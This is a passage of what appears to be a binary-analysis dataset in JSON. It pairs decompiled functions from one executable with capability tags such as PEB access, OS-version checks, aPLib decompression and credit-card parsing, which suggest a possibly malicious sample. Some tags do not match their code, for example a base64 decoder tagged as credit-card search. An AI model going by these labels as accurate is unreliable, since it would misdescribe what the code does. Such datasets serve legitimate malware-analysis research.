arg2) && (*puVar3 == '<')) {\n            arg1_00 = puVar3 + 1;\n            uVar4 = 0x40;\n            iVar2 = fcn.000668de(arg1_00, 0x40, arg2 - 1);\n            if ((iVar2 != 0) && (iVar2 - arg1_00 == 10)) {\n                uVar4 = fcn.00032bc8(arg1_00, uVar4);\n                return uVar4;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 801
    },
    "0005ef98": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint64_t fcn.0005ef98(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint64_t arg1_00;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    int64_t iVar13;\n    uint8_t uVar14;\n    \n    arg1_00 = arg2;\n    iVar3 = fcn.00030c98(arg1_00);\n    if (iVar3 != 0) {\n        if (arg2 < 0xb) {\n            fcn.0006670a(iVar3, arg1, arg1_00);\n        }\n        else {\n            uVar4 = arg1_00 & 0xffffffff;\n            iVar9 = 0;\n            do {\n                uVar2 = uVar4 / 10;\n                iVar9 = iVar9 + uVar4 % 10;\n                uVar4 = uVar2;\n            } while (0 < uVar2);\n            uVar14 = 0;\n            iVar11 = 0;\n            iVar8 = 0;\n            iVar13 = 0;\n            arg2._0_4_ = arg2 / iVar9;\n            if (0 < arg2) {\n                iVar7 = 0;\n                do {\n                    iVar5 = 0;\n                    do {\n                        if (0 < iVar9) {\n                            puVar10 = iVar11 + arg1;\n                            iVar12 = iVar9;\n                            do {\n                                iVar6 = iVar7 + 1;\n                                uVar14 = uVar14 | ((*puVar10 & 1 << (iVar5 & 0x1f)) >> (iVar5 & 0x1f)) << (iVar7 & 0x1f)\n                                ;\n                                iVar7 = iVar6;\n                                if (7 < iVar6) {\n                                    *(iVar13 + iVar3) = uVar14;\n                                    iVar8 = iVar8 + 1;\n                                    iVar13 = iVar13 + 1;\n                                    uVar14 = 0;\n                                    iVar7 = 0;\n                                }\n                                puVar10 = puVar10 + arg2;\n                                iVar12 = iVar12 + -1;\n                            } while (iVar12 != 0);\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 8);\n                    iVar11 = iVar11 + 1;\n                } while (iVar11 < arg2);\n            }\n            iVar11 = iVar8;\n            if (iVar11 < arg1_00) {\n                puVar10 = iVar11 + iVar3;\n                iVar13 = iVar3 - iVar11;\n                do {\n                    puVar1 = iVar13 + iVar11;\n                    iVar11 = iVar11 + 1;\n                    *puVar10 = *puVar1 ^ puVar10[arg1 - iVar3];\n                    puVar10 = puVar10 + 1;\n                } while (iVar11 < arg1_00);\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 703
    },
    "0001b4e8": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.0001b4e8(void)\n\n{\n    int64_t arg1;\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    int64_t iVar4;\n    bool bVar5;\n    ulong auStackX8 [4];\n    \n    fcn.00059140(*0x7e520);\n    fcn.0005540c(0x7e520);\n    fcn.00059140(*0x7e518);\n    fcn.0005540c(0x7e518);\n    fcn.00059140(*0x7e510);\n    fcn.0005540c(0x7e510);\n    fcn.00059140(*0x7e508);\n    fcn.0005540c(0x7e508);\n    iVar1 = 0;\n    LOCK();\n    bVar5 = *0x7e528 == 1;\n    *0x7e528 = *0x7e528 ^ bVar5 * *0x7e528;\n    if (!bVar5 * (*0x7e528 ^ 1) != 1) {\n        while( true ) {\n            LOCK();\n            bVar5 = *0x7e530 == 0;\n            *0x7e530 = *0x7e530 ^ bVar5 * *0x7e530;\n            if (bVar5) break;\n            auStackX8[0] = 0xffffffffffffd8f0;\n            (**0x115e8)(0, 0, auStackX8);\n        }\n        fcn.00030310(0x7e448);\n        iVar2 = 100;\n        iVar4 = *0x7e298;\n        do {\n            arg1 = *(iVar1 + iVar4);\n            if (arg1 != 0) {\n                puVar3 = arg1 + 0x20;\n                iVar4 = 100;\n                do {\n                    fcn.00030d24(*puVar3);\n                    puVar3 = puVar3 + 6;\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n                fcn.00030d24(arg1);\n                iVar4 = *0x7e298;\n            }\n            iVar1 = iVar1 + 8;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        fcn.00030d24(iVar4);\n        fcn.00030378(0x7e448);\n        fcn.000302e8(0x7e448);\n        fcn.00030310(0x7e290);\n        fcn.0006677c(0x7e2a0, 0, 0x100);\n        fcn.00030378(0x7e290);\n        fcn.000302e8(0x7e290);\n    }\n    return;\n}\n",
        "token_count": 644
    },
    "00032390": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint32_t fcn.00032390(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    \n    if (arg1 == NULL) {\n        iVar3 = -0x3fffff11;\n    }\n    else {\n        iVar1 = fcn.000307e0();\n        if (iVar1 == 0) {\n            iVar3 = -0x3fffffff;\n        }\n        else {\n            iVar2 = fcn.000668c0();\n            iVar4 = fcn.00030c98(iVar2 + 8 + 0x30);\n            *arg1 = iVar4;\n            if (iVar4 == 0) {\n                iVar3 = -0x3fffff66;\n            }\n            else {\n                iVar3 = fcn.00066860(iVar4, 1);\n                if ((iVar3 == 0) && (iVar3 = fcn.000668ba(*arg1, 1, 0, 0),  iVar3 == 0)) {\n                    if ((iVar1 != 0x1b) && (iVar1 != 0x27)) {\n                        return 0;\n                    }\n                    iVar4 = *arg1;\n                    iVar3 = fcn.000668b4(iVar4 + 0x28, iVar2 + 0x10, 2);\n                    if (iVar3 == 0) {\n                        *(iVar4 + 0x2c) = 1;\n                        *(iVar4 + 0x30) = 0x11;\n                        *(iVar4 + 0x31) = 0;\n                        *(iVar4 + 0x32) = 0xc;\n                        *(iVar4 + 0x34) = 0;\n                        iVar3 = fcn.000668ae(iVar4 + 0x38, 0x6a0c8, 1);\n                        if (iVar3 == 0) {\n                            puVar5 = fcn.000668a8(iVar4 + 0x38, 0);\n                            *puVar5 = 0x1000;\n                            iVar3 = fcn.000668a2(*arg1, 1, iVar4 + 0x28, 0);\n                            if (iVar3 == 0) {\n                                return 0;\n                            }\n                        }\n                    }\n                }\n                fcn.00030d24(*arg1);\n                *arg1 = 0;\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 559
    },
    "0002aacc": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
        "decompiled_code": "\nuint32_t fcn.0002aacc(ulong arg1)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t auStackX16 [2];\n    int64_t iStackX24;\n    uchar auStackX32 [8];\n    \n    fcn.00031204(auStackX32);\n    piVar4 = fcn.00031df0(auStackX32);\n    uVar8 = (((0x18 - piVar4[2]) * 0x3c - piVar4[1]) * 0x3c - *piVar4) * 1000;\n    iVar3 = fcn.00022138(0xfffffffe, 6, auStackX16, &iStackX24);\n    if (iVar3 == 0) {\n        uVar7 = 0;\n        if (auStackX16[0] != 0) {\n            iVar6 = 0;\n            do {\n                uVar1 = *(iVar6 + 0x10 + iStackX24);\n                uVar5 = *(iVar6 + 0x14 + iStackX24);\n                if ((((*(iVar6 + 0x12 + iStackX24) < 0x18) && (*(iVar6 + 0x11 + iStackX24) < 0x3c)) && (uVar1 != 0)) &&\n                   (uVar5 != 0)) {\n                    if (((uVar5 >> (piVar4[3] & 0x1fU) & 1) != 0) && ((uVar1 & 1 << (piVar4[6] & 0x1f)) != 0)) {\n                        iVar3 = piVar4[2];\n                        uVar1 = *(iVar6 + 0x12 + iStackX24);\n                        uVar2 = *(iVar6 + 0x11 + iStackX24);\n                        if ((iVar3 * 0x3c + piVar4[1]) * 0x3c + *piVar4 < (uVar1 * 0x3c + uVar2) * 0x3c) {\n                            uVar5 = ((((uVar1 - iVar3) * 0x3c - piVar4[1]) + uVar2) * 0x3c - *piVar4) * 1000;\n                            if (uVar5 < uVar8) {\n                                uVar8 = uVar5;\n                            }\n                        }\n                        else if (((((iVar3 - uVar1) * 0x3c - uVar2) + piVar4[1]) * 0x3c + *piVar4) * 1000 < 0x493e1)\n                        goto code_r0x0002ac0b;\n                    }\n                }\n                else if (arg1 != 0) {\ncode_r0x0002ac0b:\n                    fcn.0002a9a8(*(iVar6 + 0xc + iStackX24), *(iVar6 + 0x18 + iStackX24), *(iVar6 + 4 + iStackX24), \n                                 *(iVar6 + 0x30 + iStackX24));\n                    fcn.0002225c(*(iVar6 + iStackX24), *(iVar6 + 8 + iStackX24), *(iVar6 + 4 + iStackX24));\n                }\n                uVar7 = uVar7 + 1;\n                iVar6 = iVar6 + 0x40;\n            } while (uVar7 < auStackX16[0]);\n        }\n        fcn.000207c4(iStackX24);\n    }\n    return uVar8;\n}\n",
        "token_count": 856
    },
    "00043118": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong fcn.00043118(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char acStack200 [48];\n    char acStack152 [128];\n    \n    if (arg1 == 0) {\ncode_r0x000432a0:\n        uVar3 = 0xffffffff;\n    }\n    else {\n        uVar5 = 0;\n        *0x80480 = arg1;\n        do {\n            fcn.000295e4(acStack152, 0x73);\n            if (0 < uVar5) {\n                fcn.0006677c(acStack200, 0, 0x21);\n                fcn.00044350(acStack200, 0x21, 0x11f1c, uVar5);\n                iVar4 = 0;\n                pcVar7 = acStack152;\n                do {\n                    iVar4 = iVar4 + -1;\n                    pcVar6 = pcVar7;\n                    if (iVar4 == 0) break;\n                    pcVar6 = pcVar7 + 1;\n                    cVar1 = *pcVar7;\n                    pcVar7 = pcVar6;\n                } while (cVar1 != '\\0');\n                iVar4 = 0;\n                do {\n                    cVar1 = acStack200[iVar4];\n                    pcVar6[iVar4 + -1] = cVar1;\n                    iVar4 = iVar4 + 1;\n                } while (cVar1 != '\\0');\n            }\n            iVar4 = -1;\n            pcVar7 = acStack152;\n            do {\n                if (iVar4 == 0) break;\n                iVar4 = iVar4 + -1;\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar2 = fcn.00062ee0(uVar5 * 8 + 0x803d0);\n            if (iVar2 != 0) {\n                if (-1 < uVar5) {\n                    iVar4 = uVar5 * 8 + 0x803d0;\n                    do {\n                        fcn.00062f3c(iVar4, 0);\n                        iVar4 = iVar4 + -8;\n                        uVar5 = uVar5 - 1;\n                    } while (-1 < uVar5);\n                }\n                goto code_r0x000432a0;\n            }\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 5);\n        fcn.0002fc18(0x80390);\n        *0x803b0 = 0;\n        fcn.000324cc(0x803b8);\n        *0x80408 = 0;\n        *0x80410 = 0;\n        fcn.000324cc(0x80398);\n        *0x80418 = 0;\n        *0x803f8 = 0;\n        *0x80400 = 0;\n        fcn.0001a9b0(0x80420, 0x42d98, 0);\n        fcn.0001a9b0(0x80470, 0x42c88, *0x803f0);\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 760
    },
    "00059834": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t fcn.00059834(int64_t arg1, ulong arg2, uchar *arg3)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    \n    iVar7 = 0;\n    iVar9 = 0;\n    iVar5 = 0;\n    iVar4 = 0;\n    iVar6 = 0;\n    *arg3 = 0;\n    if (0 < arg2) {\n        do {\n            iVar2 = fcn.0006682a(0x15f10, *(iVar4 + arg1));\n            if (iVar2 != 0) {\n                uVar1 = iVar2 - 0x10;\n                if (0x1f < uVar1) {\n                    uVar1 = 0x1f;\n                }\n                iVar3 = 0;\n                do {\n                    iVar8 = iVar9 + 1;\n                    arg3[iVar6] = arg3[iVar6] | ((1 << (iVar3 & 0x1f) & uVar1) >> (iVar3 & 0x1f)) << (iVar9 & 0x1f);\n                    iVar9 = iVar8;\n                    if ((7 < iVar8) && (iVar9 = 0,  iVar5 < arg2 + -1)) {\n                        iVar7 = iVar7 + 1;\n                        iVar6 = iVar6 + 1;\n                        arg3[iVar6] = 0;\n                    }\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < 5);\n            }\n            iVar4 = iVar4 + 1;\n            iVar5 = iVar5 + 1;\n        } while (iVar4 < arg2);\n    }\n    return iVar7 + 1;\n}\n",
        "token_count": 422
    },
    "00030564": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nulong fcn.00030564(ulong arg1, int64_t *arg2)\n\n{\n    ulong uVar1;\n    int64_t arg1_00;\n    uint64_t arg1_01;\n    uint32_t auStackX16 [6];\n    \n    arg1_01 = 0x4000;\n    if (arg2 == NULL) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        while( true ) {\n            arg1_00 = fcn.00030c98(arg1_01);\n            if (arg1_00 == 0) break;\n            uVar1 = fcn.0006687e(arg1, arg1_00, arg1_01, auStackX16);\n            if (uVar1 != -0x3ffffffc) {\n                if (uVar1 == 0) {\n                    *arg2 = arg1_00;\n                    return uVar1;\n                }\n                fcn.00030d24(arg1_00);\n                return 0xffffffff;\n            }\n            fcn.00030d24(arg1_00);\n            if ((arg1 == 6) || (arg1 == 0xb)) {\n                arg1_01 = auStackX16[0];\n            }\n            else {\n                arg1_01 = arg1_01 * 2;\n            }\n        }\n        uVar1 = 0x21590004;\n    }\n    return uVar1;\n}\n",
        "token_count": 316
    },
    "00032e88": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t fcn.00032e88(ulong arg1, uint *arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    uchar auStackX32 [8];\n    \n    if (arg3 < 6) {\n        uVar1 = 0x21590068;\n    }\n    else {\n        fcn.00032650(0x7f8f0, auStackX32, 0);\n        iVar2 = fcn.00032d34(arg1, 1);\n        if (iVar2 != 0) {\n            *arg2 = *(iVar2 + 0x2c);\n            *(arg2 + 1) = *(iVar2 + 0x30);\n        }\n        fcn.00032684(0x7f8f0, auStackX32, 0);\n        uVar1 = ~-(iVar2 != 0) & 0xc000000e;\n    }\n    return uVar1;\n}\n",
        "token_count": 218
    },
    "0004af10": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0004af10(uint64_t arg1, uint32_t *arg2, int16_t *arg3)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uint32_t uStackX24;\n    uint16_t uStackX28;\n    \n    arg1 = arg1 & 0xffffffff;\n    iVar2 = fcn.00030df4();\n    if (*arg3 != iVar2) {\n        return;\n    }\n    iVar2 = fcn.00030df4();\n    if (arg3[1] != iVar2) {\n        return;\n    }\n    if (*(arg3 + 2) != '\\x06') {\n        return;\n    }\n    if (*(arg3 + 5) != '\\x04') {\n        return;\n    }\n    iVar2 = fcn.00030df4();\n    if (arg3[3] == iVar2) {\n        bVar4 = *arg2 < *0x6b620;\n        if ((*arg2 == *0x6b620) && (bVar4 = *(arg2 + 1) < *0x6b624,  *(arg2 + 1) == *0x6b624)) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = (1 - bVar4) - (bVar4 != 0);\n        }\n        if (iVar3 == 0) {\n            iVar3 = fcn.00032e88(arg1, &uStackX24, 6);\n            if (iVar3 != 0) {\n                return;\n            }\n            bVar4 = *(arg2 + 6) < uStackX24;\n            if ((*(arg2 + 6) != uStackX24) || (bVar4 = *(arg2 + 10) < uStackX28,  *(arg2 + 10) != uStackX28)) {\n                iVar3 = (1 - bVar4) - (bVar4 != 0);\n            }\n            if (iVar3 == 0) {\n                return;\n            }\n            fcn.0004a1a4(arg1, arg3 + 4, *(arg3 + 7));\n            uVar1 = *(arg3 + 0xc);\n            arg3 = NULL;\n            goto code_r0x0004aff0;\n        }\n    }\n    iVar2 = fcn.00030df4();\n    if (arg3[3] != iVar2) {\n        return;\n    }\n    uVar1 = *(arg3 + 7);\n    arg3 = arg3 + 4;\ncode_r0x0004aff0:\n    fcn.0004a1a4(arg1, arg3, uVar1);\n    return;\n}\n",
        "token_count": 609
    },
    "00047108": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nint64_t * fcn.00047108(uint64_t arg1, uint *arg2)\n\n{\n    int64_t iVar1;\n    uint8_t uVar2;\n    int64_t *piVar3;\n    int64_t *arg1_00;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    \n    piVar5 = NULL;\n    uVar6 = (arg1 & 0xffffffff) >> 5 & 0xfff;\n    if (arg1 == 0) {\n        return 0xc00000ef;\n    }\n    uVar2 = (**0x113f0)(0x8e3c0);\n    iVar1 = *0x80590;\n    arg1_00 = *(*0x80590 + uVar6 * 8);\n    piVar4 = piVar5;\n    if (arg1_00 != NULL) {\n        do {\n            piVar3 = arg1_00;\n            arg1_00 = piVar3;\n            if (piVar3[6] == arg1) break;\n            arg1_00 = *piVar3;\n            piVar4 = piVar3;\n        } while (arg1_00 != NULL);\n        if (arg1_00 != NULL) {\n            if (arg2 != NULL) {\n                *arg2 = *(arg1_00 + 8);\n            }\n            if (piVar4 == NULL) {\n                *(iVar1 + uVar6 * 8) = *arg1_00;\n            }\n            else {\n                *piVar4 = *arg1_00;\n            }\n            fcn.00030d24(arg1_00);\n            goto code_r0x00047193;\n        }\n    }\n    piVar5 = 0xc0000034;\ncode_r0x00047193:\n    (**0x113e8)(0x8e3c0, piVar4 & 0xffffffffffffff00 | uVar2);\n    return piVar5;\n}\n",
        "token_count": 439
    },
    "000471b0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nint64_t * fcn.000471b0(uint64_t arg1, uchar *arg2)\n\n{\n    uchar uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    if ((arg1 == 0) || (*0x80590 == 0)) {\n        piVar2 = NULL;\n    }\n    else {\n        iVar3 = *0x80590;\n        if (arg2 != NULL) {\n            uVar1 = (**0x113f0)(0x8e3c0);\n            iVar3 = *0x80590;\n            *arg2 = uVar1;\n        }\n        piVar2 = *(iVar3 + ((arg1 & 0xffffffff) >> 5 & 0xfff) * 8);\n        if (piVar2 != NULL) {\n            do {\n                if (piVar2[6] == arg1) break;\n                piVar2 = *piVar2;\n            } while (piVar2 != NULL);\n            if (piVar2 != NULL) {\n                return piVar2;\n            }\n        }\n        if (arg2 != NULL) {\n            (**0x113e8)(0x8e3c0, *arg2);\n        }\n    }\n    return piVar2;\n}\n",
        "token_count": 276
    },
    "0005ce3c": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nulong * fcn.0005ce3c(uint64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uint64_t uVar2;\n    \n    uVar2 = (arg1 >> 5) + arg2 & 0x3f;\n    puVar1 = fcn.00030c98(0x18);\n    if (puVar1 != NULL) {\n        *puVar1 = 0;\n        puVar1[2] = 0;\n        puVar1[1] = arg1;\n        *(puVar1 + 2) = arg2;\n        fcn.00030310(0x8e290);\n        *puVar1 = *(uVar2 * 8 + 0x8e090);\n        *(uVar2 * 8 + 0x8e090) = puVar1;\n        fcn.00030378(0x8e290);\n        puVar1 = 0x1;\n    }\n    return puVar1;\n}\n",
        "token_count": 220
    },
    "0005ceb0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nulong * fcn.0005ceb0(uint64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    ulong *arg1_00;\n    ulong *puVar2;\n    uint64_t uVar3;\n    ulong *puVar4;\n    \n    puVar2 = NULL;\n    uVar3 = (arg1 >> 5) + arg2 & 0x3f;\n    fcn.00030310(0x8e290);\n    puVar1 = *(uVar3 * 8 + 0x8e090);\n    puVar4 = puVar2;\n    do {\n        arg1_00 = puVar1;\n        if (arg1_00 == NULL) {\ncode_r0x0005cf19:\n            fcn.00030378(0x8e290);\n            return puVar2;\n        }\n        if ((arg1_00[1] == arg1) && (*(arg1_00 + 2) == arg2)) {\n            if (puVar4 == NULL) {\n                *(uVar3 * 8 + 0x8e090) = *arg1_00;\n            }\n            else {\n                *puVar4 = *arg1_00;\n            }\n            fcn.00030d24(arg1_00);\n            puVar2 = 0x1;\n            goto code_r0x0005cf19;\n        }\n        puVar1 = *arg1_00;\n        puVar4 = arg1_00;\n    } while( true );\n}\n",
        "token_count": 331
    },
    "0005cf30": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nulong fcn.0005cf30(uint64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    ulong uVar2;\n    \n    uVar2 = 0;\n    fcn.00030310(0x8e290);\n    puVar1 = *(((arg1 >> 5) + arg2 & 0x3f) * 8 + 0x8e090);\n    do {\n        if (puVar1 == NULL) {\ncode_r0x0005cf7e:\n            fcn.00030378(0x8e290);\n            return uVar2;\n        }\n        if ((puVar1[1] == arg1) && (*(puVar1 + 2) == arg2)) {\n            uVar2 = 1;\n            goto code_r0x0005cf7e;\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 201
    },
    "0003012c": {
        "rules": [
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653",
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688"
        ],
        "decompiled_code": "\nint32_t fcn.0003012c(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint64_t uVar9;\n    uint8_t uStackX24;\n    uint8_t uStackX25;\n    uint8_t uStackX26;\n    uint8_t auStackX32 [8];\n    uint8_t auStack312 [43];\n    uchar uStack269;\n    uchar uStack265;\n    char acStack264 [13];\n    uchar uStack251;\n    char acStack247 [32];\n    char acStack215 [167];\n    \n    iVar5 = 0;\n    fcn.0006677c(auStack312);\n    iVar7 = 0x41;\n    pcVar8 = acStack247;\n    do {\n        cVar2 = iVar7;\n        iVar7 = iVar7 + 1;\n        *pcVar8 = cVar2 + -0x41;\n        pcVar8 = pcVar8 + 1;\n    } while (iVar7 < 0x5b);\n    iVar7 = 0x61;\n    pcVar8 = acStack215;\n    do {\n        cVar2 = iVar7;\n        iVar7 = iVar7 + 1;\n        *pcVar8 = cVar2 + -0x47;\n        pcVar8 = pcVar8 + 1;\n    } while (iVar7 < 0x7b);\n    iVar7 = 0x30;\n    pcVar8 = acStack264;\n    do {\n        cVar2 = iVar7;\n        iVar7 = iVar7 + 1;\n        *pcVar8 = cVar2 + '\\x04';\n        pcVar8 = pcVar8 + 1;\n    } while (iVar7 < 0x3a);\n    uStack269 = 0x3e;\n    uStack265 = 0x3f;\n    uStack251 = 0;\n    uVar3 = arg3 >> 0x1f & 3;\n    if ((arg3 + uVar3 & 3) == uVar3) {\n        if (0 < arg3) {\n            iVar4 = arg1 - auStackX32;\n            uVar9 = (arg3 - 1U >> 2) + 1;\n            do {\n                iVar6 = 0;\n                do {\n                    puVar1 = auStackX32 + iVar6;\n                    iVar6 = iVar6 + 1;\n                    *puVar1 = auStack312[puVar1[iVar4]];\n                } while (iVar6 < 4);\n                uStackX24 = auStackX32[1] >> 4 | auStackX32[0] << 2;\n                uStackX26 = auStackX32[2] << 6 | auStackX32[3];\n                uStackX25 = auStackX32[2] >> 2 | auStackX32[1] << 4;\n                if (*(arg1 + 2) == '=') {\n                    iVar7 = 1;\n                }\n                else {\n                    iVar7 = (*(arg1 + 3) != '=') + 2;\n                }\n                fcn.0006670a(iVar5 + arg2, &uStackX24);\n                iVar5 = iVar5 + iVar7;\n                arg1 = arg1 + 4;\n                iVar4 = iVar4 + 4;\n                uVar9 = uVar9 - 1;\n            } while (uVar9 != 0);\n        }\n        *(iVar5 + arg2) = 0;\n    }\n    else {\n        iVar5 = -1;\n    }\n    return iVar5;\n}\n",
        "token_count": 843
    },
    "00034ba8": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint fcn.00034ba8(ulong arg1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    int16_t *piVar5;\n    uint uVar6;\n    int64_t iVar7;\n    uchar auStack184 [48];\n    int16_t aiStack136 [40];\n    \n    uVar6 = 0xffffffff;\n    iVar2 = (**0x7f938)();\n    if (iVar2 == 0) {\n        uVar4 = 0;\n        if (_pe_dos_header != 0) {\n            iVar7 = 0;\n            do {\n                fcn.00044350(auStack184, 0x27, 0x14340, *(iVar7 + 0x14));\n                fcn.0003285c(auStack184, aiStack136, 0x27);\n                uVar3 = 0xffffffffffffffff;\n                piVar5 = aiStack136;\n                do {\n                    if (uVar3 == 0) break;\n                    uVar3 = uVar3 - 1;\n                    iVar1 = *piVar5;\n                    piVar5 = piVar5 + 1;\n                } while (iVar1 != 0);\n                iVar2 = fcn.00031328(arg1, aiStack136, ~uVar3 - 1);\n                if (iVar2 == 0) {\n                    uVar6 = *(uVar4 * 0x548 + 0x10);\n                    break;\n                }\n                uVar4 = uVar4 + 1;\n                iVar7 = iVar7 + 0x548;\n            } while (uVar4 < _pe_dos_header);\n        }\n        (**0x7f940)(0);\n    }\n    return uVar6;\n}\n",
        "token_count": 396
    },
    "0004a00c": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nulong fcn.0004a00c(int16_t *arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int16_t *apiStackX8 [4];\n    \n    apiStackX8[0] = arg1;\n    uVar1 = fcn.000312a0(arg1, apiStackX8, 10);\n    if (*apiStackX8[0] == 0x2e) {\n        apiStackX8[0] = apiStackX8[0] + 1;\n        uVar2 = fcn.000312a0(apiStackX8[0], apiStackX8, 10);\n        if (*apiStackX8[0] == 0x2e) {\n            apiStackX8[0] = apiStackX8[0] + 1;\n            uVar3 = fcn.000312a0(apiStackX8[0], apiStackX8, 10);\n            if (*apiStackX8[0] == 0x2e) {\n                apiStackX8[0] = apiStackX8[0] + 1;\n                uVar4 = fcn.000312a0(apiStackX8[0], 0, 10);\n                if ((((uVar1 < 0x100) && (uVar2 < 0x100)) && (uVar3 < 0x100)) && (uVar4 < 0x100)) {\n                    *arg2 = ((uVar4 << 8 | uVar3) << 8 | uVar2) << 8 | uVar1;\n                    return 1;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 396
    },
    "0005250c": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint32_t fcn.0005250c(ulong arg1)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    \n    uVar1 = fcn.0005247c(arg1);\n    uVar2 = fcn.0005247c(arg1);\n    return uVar2 << 8 | arg1 & 0xffff0000 | uVar1;\n}\n",
        "token_count": 87
    },
    "00052538": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint fcn.00052538(ulong arg1)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    uchar uVar3;\n    uchar uVar4;\n    \n    uVar1 = fcn.0005247c(arg1);\n    uVar2 = fcn.0005247c(arg1);\n    uVar3 = fcn.0005247c(arg1);\n    uVar4 = fcn.0005247c(arg1);\n    return CONCAT13(uVar4, CONCAT12(uVar3, CONCAT11(uVar2, uVar1)));\n}\n",
        "token_count": 124
    },
    "00052588": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nulong fcn.00052588(ulong arg1)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    uchar uVar3;\n    uchar uVar4;\n    uchar uVar5;\n    uchar uVar6;\n    uchar uVar7;\n    uchar uVar8;\n    \n    uVar1 = fcn.0005247c(arg1);\n    uVar2 = fcn.0005247c(arg1);\n    uVar3 = fcn.0005247c(arg1);\n    uVar4 = fcn.0005247c(arg1);\n    uVar5 = fcn.0005247c(arg1);\n    uVar6 = fcn.0005247c(arg1);\n    uVar7 = fcn.0005247c(arg1);\n    uVar8 = fcn.0005247c(arg1);\n    return CONCAT17(uVar8, CONCAT16(uVar7, CONCAT15(uVar6, CONCAT14(uVar5, CONCAT13(uVar4, CONCAT12(uVar3, CONCAT11(\n                                                            uVar2, uVar1)))))));\n}\n",
        "token_count": 235
